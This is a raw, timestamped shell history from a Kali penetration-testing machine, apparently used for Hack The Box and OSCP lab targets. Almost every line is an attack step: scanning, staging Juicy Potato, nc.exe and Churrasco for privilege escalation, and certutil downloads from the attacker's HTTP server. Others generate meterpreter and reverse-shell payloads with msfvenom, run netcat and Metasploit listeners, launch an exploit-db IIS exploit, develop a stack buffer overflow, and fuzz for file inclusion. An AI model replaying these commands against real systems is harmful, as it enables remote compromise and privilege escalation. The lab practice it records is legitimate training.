 7695  2020-11-26 03:13  sudo rlwrap nc -lnvp 4444
 7696  2020-11-26 03:17  locate / | grep accesschk.exe
 7697  2020-11-26 03:20  cd /opt/tmux-logging
 7698  2020-11-26 03:20  l
 7699  2020-11-26 03:20  cd
 7700  2020-11-26 03:23  ls
 7701  2020-11-26 03:23  cd /opt
 7702  2020-11-26 03:23  ls
 7703  2020-11-26 03:23  cd
 7704  2020-11-26 03:23  locate winpeas
 7705  2020-11-26 03:23  cd /home/kali/Downloads/
 7706  2020-11-26 03:23  cp privilege-escalation-awesome-scripts-suite /opt
 7707  2020-11-26 03:23  cp -r privilege-escalation-awesome-scripts-suite /opt
 7708  2020-11-26 03:23  sudo cp -r privilege-escalation-awesome-scripts-suite /opt
 7709  2020-11-26 03:24  cd /opt/privilege-escalation-awesome-scripts-suite/
 7710  2020-11-26 03:24  l
 7711  2020-11-26 03:24  git pull
 7712  2020-11-26 03:24  git fetch
 7713  2020-11-26 03:24  sudo git pull
 7714  2020-11-26 03:24  l
 7715  2020-11-26 03:25  locate / | grep accesschk.exe
 7716  2020-11-26 03:25  cd 
 7717  2020-11-26 03:25  cd HTB/windows_priv_esc_scripts
 7718  2020-11-26 03:25  cp /home/kali/oscpdata/accesschk.exe ./
 7719  2020-11-26 03:25  l
 7720  2020-11-26 03:26  cd RottenPotatoNG
 7721  2020-11-26 03:26  l
 7722  2020-11-26 03:27  cd RottenPotatoEXE
 7723  2020-11-26 03:27  l
 7724  2020-11-26 03:27  cd x64
 7725  2020-11-26 03:27  l
 7726  2020-11-26 03:27  cd Release
 7727  2020-11-26 03:27  l
 7728  2020-11-26 03:27  sudo python -m SimpleHTTPServer 80
 7729  2020-11-26 05:43  ls
 7730  2020-11-26 05:43  cd ..
 7731  2020-11-26 05:43  l
 7732  2020-11-26 05:43  cd Release
 7733  2020-11-26 05:43  l
 7734  2020-11-26 05:43  cd ..
 7735  2020-11-26 05:43  l
 7736  2020-11-26 05:45  cp ~/Downloads/Juicy.Potato.x86.exe ./
 7737  2020-11-26 05:45  l
 7738  2020-11-26 05:46  certutil.exe -urlcache -split -f "http://10.10.14.39/Juicy.Potato.x86.exe" Juicy.Potato.x86.exeu
 7739  2020-11-26 05:46  sudo python -m SimpleHTTPServer 80
 7740  2020-11-26 05:49  ls
 7741  2020-11-26 05:50  cat copycommands
 7742  2020-11-26 05:50  locate / | grep rshell.ps1
 7743  2020-11-26 05:51  cp /home/kali/oscpdata/rshell.ps1 ./
 7744  2020-11-26 05:51  l
 7745  2020-11-26 05:51  mkdir powershell_rshells
 7746  2020-11-26 05:51  ls
 7747  2020-11-26 05:51  mv rshell.ps1 powershell_rshells
 7748  2020-11-26 05:51  l
 7749  2020-11-26 05:51  cd powershell_rshells
 7750  2020-11-26 05:51  l
 7751  2020-11-26 05:51  sudo python -m SimpleHTTPServer 80
 7752  2020-11-26 05:51  vim rshell.ps1
 7753  2020-11-26 05:51  locate / | grep rshell.ps1
 7754  2020-11-26 05:52  cp /home/kali/OSCP/admin_dept/results/10.3.3.14/exploit/rshell.ps1 ./
 7755  2020-11-26 05:52  l
 7756  2020-11-26 05:52  vim rshell.ps1
 7757  2020-11-26 05:52  sudo python -m SimpleHTTPServer 80
 7758  2020-11-26 05:52  cat ../copycommands
 7759  2020-11-26 05:52  vim rshell.ps1
 7760  2020-11-26 05:52  sudo python -m SimpleHTTPServer 80
 7761  2020-11-26 05:53  sudo rlwrap nc -lnvp 443
 7762  2020-11-26 06:06  ls
 7763  2020-11-26 06:06  cd //
 7764  2020-11-26 06:07  cd ~/HTB/windows_priv_esc_scripts/powershell_rshells
 7765  2020-11-26 06:07  ls
 7766  2020-11-26 06:07  cd ..
 7767  2020-11-26 06:07  mkdir windows_tools
 7768  2020-11-26 06:07  cd windows_tools
 7769  2020-11-26 06:07  cp /home/kali/Downloads/nc.exe ./
 7770  2020-11-26 06:07  cp /usr/share/windows-resources/binaries/plink.exe ./
 7771  2020-11-26 06:07  l
 7772  2020-11-26 06:07  sudo python -m SimpleHTTPServer 80
 7773  2020-11-26 06:08  cat ../copycommands
 7774  2020-11-26 06:08  certutil.exe -urlcache -split -f "http://10.10.14.39/nc.exe" nc.exe
 7775  2020-11-26 06:08  sudo python -m SimpleHTTPServer 80
 7776  2020-11-26 06:10  sudo rlwrap nc -lnvp 4444
 7777  2020-11-26 06:13  cat ../../results/10.10.10.5/scans/topports.nmap
 7778  2020-11-26 06:13  ftp 10.10.10.5
 7779  2020-11-26 06:13  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreter.aspx
 7780  2020-11-26 06:14  ftp 10.10.10.5
 7781  2020-11-26 06:14  l
 7782  2020-11-26 06:15  mv ../meterpreter.aspx ../../results/10.10.10.5/scans
 7783  2020-11-26 06:15  cd ../../results/10.10.10.5/scans
 7784  2020-11-26 06:15  l
 7785  2020-11-26 06:15  msfvenom  -p  windows/meterpreter/reverse_tcp  lhost=10.10.14.39 lport=4444  -f aspx -o meterpreterx86.aspx
 7786  2020-11-26 06:15  l
 7787  2020-11-26 06:16  cat topports.nmap
 7788  2020-11-26 06:16  ftp 10.10.10.5
 7789  2020-11-26 06:16  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD php/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7790  2020-11-26 06:19  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7791  2020-11-26 06:24  sudo rlwrap nc -lnvp 443
 7792  2020-11-26 06:56  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7793  2020-11-26 07:08  cd ..
 7794  2020-11-26 07:08  ping 10.10.10.13
 7795  2020-11-26 07:09  autorecon 10.10.10.13
 7796  2020-11-26 07:09  cd ..
 7797  2020-11-26 07:09  l
 7798  2020-11-26 07:10  ping  10.10.10.60
 7799  2020-11-26 07:10  ping  10.10.10.63
 7800  2020-11-26 07:15  ping 10.10.10.60
 7801  2020-11-26 07:15  cd ..
 7802  2020-11-26 07:15  autorecon 10.10.10.60
 7803  2020-11-26 08:02  cd HTB/
 7804  2020-11-26 08:02  autorecon 10.10.10.63
 7805  2020-11-26 08:02  ping 10.10.10.63
 7806  2020-11-26 08:02  autorecon 10.10.10.63
 7807  2020-11-26 08:02  ls
 7808  2020-11-26 08:03  ping 10.10.10.15
 7809  2020-11-26 08:06  ping 10.10.10.15\n: 1606378011:0;ping 10.10.10.15
 7810  2020-11-26 08:06  ping 10.10.10.14
 7811  2020-11-26 08:06  cd HTB/
 7812  2020-11-26 08:06  l
 7813  2020-11-26 08:07  ./create_direcotry.sh 10.10.10.15
 7814  2020-11-26 08:07  ./create_direcotry.sh 10.10.10.14
 7815  2020-11-26 08:07  cd results
 7816  2020-11-26 08:07  cd 10.10.10.14
 7817  2020-11-26 08:07  ls
 7818  2020-11-26 08:07  cd scans
 7819  2020-11-26 08:07  l
 7820  2020-11-26 08:07  nmap -sCV -oA topports 10.10.10.14
 7821  2020-11-26 08:07  cd results
 7822  2020-11-26 08:07  cd 10.10.10.63
 7823  2020-11-26 08:07  l
 7824  2020-11-26 08:07  cd scans
 7825  2020-11-26 08:07  l
 7826  2020-11-26 08:08  nmap -p- -T4 -oA allport 10.10.10.14
 7827  2020-11-26 08:12  cd ~/HTB/results/10.10.10.14/scans
 7828  2020-11-26 08:12  gobuster dir -u 10.10.10.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7829  2020-11-26 08:12  cd ~/HTB/results/10.10.10.14/scans
 7830  2020-11-26 08:12  ls
 7831  2020-11-26 08:13  nikto -ask=no -h http://10.10.10.14 2>&1 | tee "niktoscan"
 7832  2020-11-26 08:14  l
 7833  2020-11-26 08:15  cat topports.gnmap
 7834  2020-11-26 08:15  cat topports.nmap
 7835  2020-11-26 08:15  gobuster dir -u 10.10.10.14:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 7836  2020-11-26 08:15  nikto -ask=no -h http://10.10.10.14:80 2>&1 | tee "niktoscan"
 7837  2020-11-26 08:23  exit
 7838  2020-11-26 08:29  exi
 7839  2020-11-26 08:29  exit
 7840  2020-11-26 08:29  s
 7841  2020-11-26 08:33  exit
 7842  2020-11-26 19:20  sudo netdiscover -i eth0
 7843  2020-11-26 19:22  ping 192.168.182.130
 7844  2020-11-26 19:22  cd
 7845  2020-11-26 19:23  cd HTB/
 7846  2020-11-26 19:23  l
 7847  2020-11-26 19:23  cd results
 7848  2020-11-26 19:23  cd 192.168.182.130l
 7849  2020-11-26 19:23  cd 192.168.182.130
 7850  2020-11-26 19:23  l
 7851  2020-11-26 19:23  cd scans
 7852  2020-11-26 19:23  l
 7853  2020-11-26 19:23  nmap -sCV -oA topports 192.168.182.130
 7854  2020-11-26 19:25  l
 7855  2020-11-26 19:25  exit
 7856  2020-11-26 19:25  less topports.nmap
 7857  2020-11-26 19:39  ping 10.10.10.15
 7858  2020-11-26 19:39  ping  10.10.10.14
 7859  2020-11-26 19:39  cd ..
 7860  2020-11-26 19:39  l
 7861  2020-11-26 19:39  cd ..
 7862  2020-11-26 19:39  l
 7863  2020-11-26 19:39  cd  10.10.10.14
 7864  2020-11-26 19:39  l
 7865  2020-11-26 19:39  cd scans
 7866  2020-11-26 19:39  l
 7867  2020-11-26 19:39  davtest  10.10.10.14
 7868  2020-11-26 19:40  davtest -url 10.10.10.14\n
 7869  2020-11-26 19:42  l
 7870  2020-11-26 19:42  cat topports.nmap
 7871  2020-11-26 19:43  cd ..
 7872  2020-11-26 19:43  l
 7873  2020-11-26 19:43  cd exploit
 7874  2020-11-26 19:43  l
 7875  2020-11-26 19:43  vim lol.py
 7876  2020-11-26 19:43  chmod +x lol.py
 7877  2020-11-26 19:43  python lol.py
 7878  2020-11-26 19:44  l
 7879  2020-11-26 19:45  cp ../../10.10.10.5/scans/meterpreter64.aspx
 7880  2020-11-26 19:45  cp ../../10.10.10.5/scans/meterpreter64.aspx ./
 7881  2020-11-26 19:45  cp ../../10.10.10.5/scans/meterpreterx86.aspx ./
 7882  2020-11-26 19:45  l
 7883  2020-11-26 19:45  ip a
 7884  2020-11-26 19:45  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 10.10.14.39;\\nset LPORT 4444;\\nrun"
 7885  2020-11-26 19:46  python lol.py
 7886  2020-11-26 19:46  python lol.py 10.10.10.14 meterpreterx86.aspx
 7887  2020-11-26 19:52  touch webshell.aspx
 7888  2020-11-26 19:52  vim webshell.aspx
 7889  2020-11-26 19:52  python lol.py 10.10.10.14 webshell.aspx
 7890  2020-11-26 19:52  python lol.py http://10.10.10.14 webshell.aspx
 7891  2020-11-26 19:52  vim lol.py
 7892  2020-11-26 20:22  l
 7893  2020-11-26 20:22  cat ../scans/topports.nmap
 7894  2020-11-26 20:22  serachsploit Microsoft IIS
 7895  2020-11-26 20:22  searchsploit Microsoft IIS
 7896  2020-11-26 20:23  cat ../scans/topports.nmap
 7897  2020-11-26 20:23  searchsploit windows/remote/41738.py
 7898  2020-11-26 20:23  searchsploit -x windows/remote/41738.py
 7899  2020-11-26 20:24  searchsploit -p windows/remote/41738.py
 7900  2020-11-26 20:24  cp /usr/share/exploitdb/exploits/windows/remote/41738.py ./
 7901  2020-11-26 20:24  l
 7902  2020-11-26 20:24  vim 41738.py
 7903  2020-11-26 20:25  python 41738.py
 7904  2020-11-26 20:30  /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update 
 7905  2020-11-26 20:36  l
 7906  2020-11-26 20:36  vim lol.py
 7907  2020-11-26 20:37  sudo rlwrap nc -lnvp 443
 7908  2020-11-26 20:37  python lol.py 10.10.10.14 10.10.14.39 443
 7909  2020-11-26 20:37  python lol.py 10.10.10.14 80 10.10.14.39 443
 7910  2020-11-26 20:38  cat ../scans/topports.nmap
 7911  2020-11-26 21:04  python lol.py 10.10.10.14 80 10.10.14.39 443
 7912  2020-11-26 21:05  ls
 7913  2020-11-26 21:10  searchsploit -p windows/remote/41738.py
 7914  2020-11-26 21:36  cd ..
 7915  2020-11-26 21:36  l
 7916  2020-11-26 21:36  cd ..
 7917  2020-11-26 21:36  l
 7918  2020-11-26 21:36  cd ..
 7919  2020-11-26 21:36  l
 7920  2020-11-26 21:36  cd windows_priv_esc_scripts
 7921  2020-11-26 21:36  l
 7922  2020-11-26 21:36  touch windowsServer2003kernel
 7923  2020-11-26 21:37  rm windowsServer2003kernel
 7924  2020-11-26 21:37  mkdir windowsServer2003kernel
 7925  2020-11-26 21:37  cd windowsServer2003kernel
 7926  2020-11-26 21:37  git clone https://github.com/Re4son/Churrasco.git
 7927  2020-11-26 21:38  l
 7928  2020-11-26 21:38  cd Churrasco
 7929  2020-11-26 21:38  kl
 7930  2020-11-26 21:38  l
 7931  2020-11-26 21:38  cd ..
 7932  2020-11-26 21:38  l
 7933  2020-11-26 21:38  cd windows_tools
 7934  2020-11-26 21:38  l
 7935  2020-11-26 21:38  cp nc.exe ../windowsServer2003kernel
 7936  2020-11-26 21:38  cd ..
 7937  2020-11-26 21:38  l
 7938  2020-11-26 21:38  cd windowsServer2003kernel
 7939  2020-11-26 21:38  l
 7940  2020-11-26 21:38  mv nc.exe Churrasco
 7941  2020-11-26 21:38  l
 7942  2020-11-26 21:38  cd Churrasco
 7943  2020-11-26 21:38  l
 7944  2020-11-26 21:39  sudo impacket-smbserver SPITFIRE  ./\n
 7945  2020-11-26 21:41  sudo rlwrap nc -lnvp 4444
 7946  2020-11-27 04:45  ls
 7947  2020-11-27 04:47  cd HTB/
 7948  2020-11-27 04:47  l
 7949  2020-11-27 04:47  cd results
 7950  2020-11-27 04:47  l
 7951  2020-11-27 04:47  cd 192.168.182.130
 7952  2020-11-27 04:47  l
 7953  2020-11-27 04:47  cd scans
 7954  2020-11-27 04:47  l
 7955  2020-11-27 04:47  cd ..
 7956  2020-11-27 04:47  l
 7957  2020-11-27 05:12  ip a
 7958  2020-11-27 05:12  ping 10.10.135.128
 7959  2020-11-27 05:12  nmap 10.10.135.128
 7960  2020-11-27 05:12  nmap -sCV 10.10.135.128
 7961  2020-11-27 05:14  rdesktop  10.10.135.128
 7962  2020-11-27 21:00  exit
 7963  2020-11-27 21:00  l
 7964  2020-11-27 21:00  cd
 7965  2020-11-27 21:00  l
 7966  2020-11-27 21:00  ll
 7967  2020-11-27 21:00  #proxychains wfuzz -c -w ./winlfi2.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=FUZZ  --hw 235,234,236,237,238
 7968  2020-11-27 21:00  ls
 7969  2020-11-27 21:00  ll
 7970  2020-11-27 21:01  cd Downloads
 7971  2020-11-27 21:01  l
 7972  2020-11-27 21:01  ls
 7973  2020-11-27 21:01  sudo python -m SimpleHTTPServer 80
 7974  2020-11-27 21:04  l
 7975  2020-11-27 21:04  cd htb
 7976  2020-11-27 21:04  l
 7977  2020-11-27 21:04  cd
 7978  2020-11-27 21:04  cd HTB
 7979  2020-11-27 21:04  cd results
 7980  2020-11-27 21:04  l
 7981  2020-11-27 21:04  cd 192.168.182.130
 7982  2020-11-27 21:04  l
 7983  2020-11-27 21:04  cd scans
 7984  2020-11-27 21:04  l
 7985  2020-11-27 21:05  sudo rlwrap nc -nv 192.168.182.131 9999
 7986  2020-11-27 21:33  nmap -sCV -oA topports 192.168.182.131
 7987  2020-11-27 21:34  nmap -sCV -oA topports 192.168.182.133
 7988  2020-11-27 21:34  ping 192.168.182.133
 7989  2020-11-27 21:35  nmap 192.168.182.133
 7990  2020-11-27 21:35  nmap -Pn 192.168.182.133
 7991  2020-11-27 21:35  sudo rlwrap nc -nv 192.168.182.133 9999
 7992  2020-11-27 21:36  sudo nc  192.168.182.133 9999
 7993  2020-11-27 21:38  python -c 'print A * 5000'
 7994  2020-11-27 21:38  python -c 'print "A" * 5000'
 7995  2020-11-27 21:38  sudo nc  192.168.182.133 9999
 7996  2020-11-27 21:42  l
 7997  2020-11-27 21:42  cd ..
 7998  2020-11-27 21:42  ;
 7999  2020-11-27 21:42  l
 8000  2020-11-27 21:42  cd exploit
 8001  2020-11-27 21:42  l
 8002  2020-11-27 21:42  touch BOF.py 
 8003  2020-11-27 21:42  vim BOF.py
 8004  2020-11-27 21:56  chmod +x BOF.py
 8005  2020-11-27 21:56  python BOF.py
 8006  2020-11-27 21:56  vim BOF.py
 8007  2020-11-27 21:57  python BOF.py
 8008  2020-11-27 21:57  vim BOF.py
 8009  2020-11-27 21:58  python BOF.py
 8010  2020-11-27 21:58  vim BOF.py
 8011  2020-11-27 21:59  python BOF.py
 8012  2020-11-27 21:59  vim BOF.py
 8013  2020-11-27 21:59  python BOF.py
 8014  2020-11-27 21:59  vim BOF.py
 8015  2020-11-27 22:00  l
 8016  2020-11-27 22:00  vim BOF.py
 8017  2020-11-27 22:00  ./BOF.py
 8018  2020-11-27 22:00  python3 BOF.py
 8019  2020-11-27 22:01  python3 BOF.py 192.168.182.133 9999
 8020  2020-11-27 22:02  vim BOF.py
 8021  2020-11-27 22:03  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 8022  2020-11-27 22:04  ls
 8023  2020-11-27 22:04  vim BOF.py
 8024  2020-11-27 22:05  chmod +x python2fuzzing
 8025  2020-11-27 22:05  vim python2fuzzing
 8026  2020-11-27 22:05  vim .
 8027  2020-11-27 22:06  vim python2findingoffset.py
 8028  2020-11-27 22:11  python python2findingoffset.py
 8029  2020-11-27 22:11  vim python2findingoffset.py
 8030  2020-11-27 22:12  python python2findingoffset.py
 8031  2020-11-27 22:12  python3 python2findingoffset.py
 8032  2020-11-27 22:12  vim python2findingoffset.py
 8033  2020-11-27 22:12  python python2findingoffset.py
 8034  2020-11-27 22:12  vim python2findingoffset.py
 8035  2020-11-27 22:12  python python2findingoffset.py
 8036  2020-11-27 22:13  vim python2findingoffset.py
 8037  2020-11-27 22:13  find / 2>/dev/null | grep reindent.py
 8038  2020-11-27 22:19  /home/kali/.local/lib/python3.8/site-packages/sqlparse/filters/reindent.py python2findingoffset.py
 8039  2020-11-27 22:19  sudo /home/kali/.local/lib/python3.8/site-packages/sqlparse/filters/reindent.py python2findingoffset.py
 8040  2020-11-27 22:19  sudo python /home/kali/.local/lib/python3.8/site-packages/sqlparse/filters/reindent.py python2findingoffset.py
 8041  2020-11-27 22:19  ll
 8042  2020-11-27 22:19  chmod +x python2findingoffset.py
 8043  2020-11-27 22:19  python python2findingoffset.py
 8044  2020-11-27 22:21  vim python2findingoffset.py
 8045  2020-11-27 22:22  python python2findingoffset.py
 8046  2020-11-27 22:22  vim python2findingoffset.py
 8047  2020-11-27 22:22  python python2findingoffset.py
 8048  2020-11-27 22:31  vim python2findingoffset.py
 8049  2020-11-27 22:32  ls
 8050  2020-11-27 22:32  vim BOF.py
 8051  2020-11-27 22:32  35724134
 8052  2020-11-27 22:33  vim .tmux.conf 
 8053  2020-11-27 22:34  exit
 8054  2020-11-27 22:34  l
 8055  2020-11-27 22:34  vim BOF.py
 8056  2020-11-27 22:35  exit
 8057  2020-11-27 22:37  ls
 8058  2020-11-27 22:37  vim BOF.py
 8059  2020-11-27 22:37  exit
 8060  2020-11-27 22:37  vim BOF.py
 8061  2020-11-27 22:37  exit
 8062  2020-11-27 23:59  sudo rlwrap nc -lnvp 443
 8063  2020-11-12 20:38  ls
 8064  2020-11-12 20:38  python3 --version
 8065  2020-11-12 20:38  python --version
 8066  2020-11-12 20:38  ruby -vserin
 8067  2020-11-12 20:38  ruby --version
 8068  2020-11-12 20:38  gem
 8069  2020-11-12 20:38  gem --versin
 8070  2020-11-12 20:38  gem --version
 8071  2020-11-12 20:39  ls
 8072  2020-11-12 20:40  cd HTB/
 8073  2020-11-12 20:40  l
 8074  2020-11-12 20:40  cd results
 8075  2020-11-12 20:40  l
 8076  2020-11-12 20:40  veil
 8077  2020-11-12 20:40  cd 10.10.10.59
 8078  2020-11-12 20:40  l
 8079  2020-11-12 20:40  cd exploit
 8080  2020-11-12 20:40  l
 8081  2020-11-12 20:49  tmux sessions
 8082  2020-11-12 20:49  tmux session
 8083  2020-11-12 20:52  tmux new -S HTB
 8084  2020-11-12 20:52  tmux new -s HTB
 8085  2020-11-18 07:03  cd
 8086  2020-11-18 07:03  ls
 8087  2020-11-18 07:06  vim .tmux.conf
 8088  2020-11-18 07:08  source .tmux.conf
 8089  2020-11-18 07:08  tmux new -s HTB
 8090  2020-11-27 22:34  cd HTB/results/192.168.182.130/exploit
 8091  2020-11-27 22:34  l
 8092  2020-11-27 22:34  cat BOF.py
 8093  2020-11-27 22:34  source ~/.tmux.conf
 8094  2020-11-27 22:34  tmux new -s HTB
 8095  2020-11-27 22:35  l
 8096  2020-11-27 22:35  vim BOF.py
 8097  2020-11-27 22:36  vim ~/.tmux.conf
 8098  2020-11-27 22:37  source ~/.tmux.conf
 8099  2020-11-27 22:37  tmux new -s HTB
 8100  2020-11-27 22:37  vim ~/.tmux.conf
 8101  2020-11-27 22:37  source ~/.tmux.conf
 8102  2020-11-27 22:37  tmux new -s HTB
 8103  2020-11-27 22:38  l
 8104  2020-11-27 22:38  cat BOF.py
 8105  2020-11-27 22:39  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35724134
 8106  2020-11-27 22:40  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 
 8107  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35724134
 8108  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35
 8109  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 
 8110  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35724134
 8111  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35724134 sdfkgjsdklf
 8112  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 
 8113  2020-11-27 22:41  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 –q 35724134
 8114  2020-11-27 22:42  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 
 8115  2020-11-27 22:42  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000
 8116  2020-11-27 22:42  /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 35724134
 8117  2020-11-27 22:42  ls
 8118  2020-11-27 22:42  vim BOF.py
 8119  2020-11-27 22:46  touch controlingESP.py
 8120  2020-11-27 22:46  vim controlingESP.py
 8121  2020-11-27 22:52  ls
 8122  2020-11-27 22:52  vim BOF.py
 8123  2020-11-27 22:53  chmod +x controlingESP.py
 8124  2020-11-27 22:54  python controlingESP.py
 8125  2020-11-27 22:56  touch badchars.py
 8126  2020-11-27 22:56  vim b
 8127  2020-11-27 22:56  vim badchars.py
 8128  2020-11-27 22:57  chmod +x badchars.py
 8129  2020-11-27 23:01  python badchars.py
 8130  2020-11-27 23:04  vim badchars.py
 8131  2020-11-27 23:05  python badchars.py
 8132  2020-11-27 23:07  vim badchars.py
 8133  2020-11-27 23:09  python badchars.py
 8134  2020-11-27 23:10  vim badchars.py
 8135  2020-11-27 23:15  python badchars.py
 8136  2020-11-27 23:24  vim badchars.py
 8137  2020-11-27 23:25  python badchars.py
 8138  2020-11-27 23:26  vim badchars.py
 8139  2020-11-27 23:37  nasm_shell in /usr/share/meta/sploit-framework/tools/exploit/nasm
 8140  2020-11-27 23:37  /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
 8141  2020-11-27 23:44  ls
 8142  2020-11-27 23:44  touch jmpesp.py
 8143  2020-11-27 23:44  vim jmpesp.py
 8144  2020-11-27 23:50  l
 8145  2020-11-27 23:50  chmod +x jmpesp.py
 8146  2020-11-27 23:50  vim jmpesp.py
 8147  2020-11-27 23:54  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.182.128 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00"
 8148  2020-11-27 23:55  ls
 8149  2020-11-27 23:55  vim jmpesp.py
 8150  2020-11-27 23:56  touch payload.py
 8151  2020-11-27 23:56  vim p
 8152  2020-11-27 23:57  vim payload.py
 8153  2020-11-27 23:59  l
 8154  2020-11-27 23:59  chmod +x payload.py
 8155  2020-11-27 23:59  python payload.py
 8156  2020-11-27 23:59  vim payload.py
 8157  2020-11-27 23:59  python payload.py
 8158  2020-11-28 00:00  l
 8159  2020-11-28 00:07  vim .
 8160  2020-11-28 00:07  l
 8161  2020-11-28 00:08  python payload.py
 8162  2020-11-28 00:08  python 6_payload.py
 8163  2020-11-28 01:33  ip a
 8164  2020-11-13 01:39  suod -s
 8165  2020-11-13 01:39  sudo -s
 8166  2020-11-28 01:39  l
 8167  2020-11-28 01:39  ll
 8168  2020-11-28 01:39  tmux new -s HTB
 8169  2020-11-28 01:40  l
 8170  2020-11-28 01:40  ll
 8171  2020-11-28 01:40  vim oSCP
 8172  2020-11-28 01:40  ll
 8173  2020-11-28 01:40  cd go
 8174  2020-11-28 01:40  ;
 8175  2020-11-28 01:40  l
 8176  2020-11-28 01:40  cd ..
 8177  2020-11-28 01:40  l
 8178  2020-11-28 01:40  vim .bash_history
 8179  2020-11-28 01:40  l
 8180  2020-11-28 01:40  exit
 8181  2020-11-28 01:40  tmux new -s HTB
 8182  2020-11-28 01:40  ls
 8183  2020-11-28 01:41  vim .tmux.conf 
 8184  2020-11-28 01:45  exit
 8185  2020-11-28 01:45  tmux new -s HTB
 8186  2020-11-28 01:45  vim .tmux.conf
 8187  2020-11-28 01:45  l
 8188  2020-11-28 01:45  ll
 8189  2020-11-28 01:45  ls
 8190  2020-11-28 01:45  l
 8191  2020-11-28 01:45  l;
 8192  2020-11-28 01:45  ll
 8193  2020-11-28 01:45  ls
 8194  2020-11-28 01:45  cd oscP
 8195  2020-11-28 01:45  l
 8196  2020-11-28 01:45  =
 8197  2020-11-28 01:45  l
 8198  2020-11-28 01:45  ll
 8199  2020-11-28 01:45  cd HTB
 8200  2020-11-28 01:45  l
 8201  2020-11-28 01:47  ping 10.10.10.60
 8202  2020-11-28 01:47  ping 10.10.10.63
 8203  2020-11-28 01:47  ping 10.10.10.62
 8204  2020-11-28 01:48  ping 10.10.10.60
 8205  2020-11-28 01:48  ping 10.10.10.74
 8206  2020-11-28 01:48  sudo -s
 8207  2020-11-28 01:49  ping 10.10.10.74
 8208  2020-11-28 01:49  ping 10.10.10.60
 8209  2020-11-28 01:49  ping 10.10.10.63
 8210  2020-11-28 01:49  ping 10.10.10.60
 8211  2020-11-28 01:49  l
 8212  2020-11-28 01:49  cd results
 8213  2020-11-28 01:49  l
 8214  2020-11-28 01:50  cd ..
 8215  2020-11-28 01:50  l
 8216  2020-11-28 01:50  ping 10.10.10.74
 8217  2020-11-28 01:50  #auto10.10.10.74
 8218  2020-11-28 01:50  autorecon 10.10.10.74
 8219  2020-11-28 01:51  ls
 8220  2020-11-28 01:51  ping 10.10.10.60
 8221  2020-11-28 01:52  ping 10.10.10.63
 8222  2020-11-28 01:52  cd Pictures
 8223  2020-11-28 01:52  l
 8224  2020-11-28 01:52  cd. .
 8225  2020-11-28 01:52  l
 8226  2020-11-28 01:52  cd
 8227  2020-11-28 01:52  cd HTB
 8228  2020-11-28 01:52  l
 8229  2020-11-28 01:52  cd results
 8230  2020-11-28 01:52  l;
 8231  2020-11-28 01:52  cd 10.10.10.63
 8232  2020-11-28 01:52  l
 8233  2020-11-28 01:52  cd scans
 8234  2020-11-28 01:52  l
 8235  2020-11-28 01:52  cat tcp_80_http_nikto.txt
 8236  2020-11-28 01:52  cat tcp_80_http_whatweb.txt
 8237  2020-11-28 01:52  l
 8238  2020-11-28 01:53  cat smbmap-execute-command.txt
 8239  2020-11-28 01:53  cat smbmap-list-contents.txt
 8240  2020-11-28 01:53  cat smbmap-share-permissions.txt
 8241  2020-11-28 01:53  cat smbclient.txt
 8242  2020-11-28 01:53  cat tcp_50000_http_gobuster.txt
 8243  2020-11-28 01:53  cat tcp_80_http_gobuster.txt
 8244  2020-11-28 01:53  cat tcp_80_http_nmap.txt
 8245  2020-11-28 01:55  cat tcp_50000_http_gobuster.txt
 8246  2020-11-28 01:55  l
 8247  2020-11-28 01:56  cat tcp_80_http_index.html
 8248  2020-11-28 01:56  l
 8249  2020-11-28 01:56  cast _full_tcp_nmap.txt
 8250  2020-11-28 01:56  cat _full_tcp_nmap.txt
 8251  2020-11-28 01:56  searchsploit Jetty
 8252  2020-11-28 01:57  searchsploit -x windows/remote/36318.txt
 8253  2020-11-28 02:01  #wfuzz -c -w ./winlfi2.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=FUZZ  --hw 235,234,236,237,238
 8254  2020-11-28 02:01  locate ~ | grep winlfi2.txt
 8255  2020-11-28 02:01  cp /home/kali/OSCP/dev_dept/10.2.2.86/exploit/winlfi2.txt ./
 8256  2020-11-28 02:02  wfuzz -c -w ./winlfi2.txt -u http://10.10.10.63:50000\?p\=source\&file\=FUZZ  --hw 235,234,236,237,238
 8257  2020-11-28 02:02  l
